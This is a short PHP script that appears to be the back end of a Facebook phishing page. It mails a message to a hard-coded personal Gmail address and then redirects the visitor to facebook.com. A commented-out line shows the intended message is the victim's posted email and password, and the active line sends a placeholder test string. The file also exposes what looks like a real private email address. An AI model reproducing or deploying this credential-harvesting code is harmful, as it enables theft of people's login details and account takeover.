<?php

$to      = 'melkamudagne19@gmail.com';
$subject = 'the subject';
//$message = $_POST["email"] . "  :  " . $_POST["pass"];
$message="melkamu";
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To:webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message,$headers);


$newURL = "https://www.facebook.com";
header('Location: '.$newURL);
?>
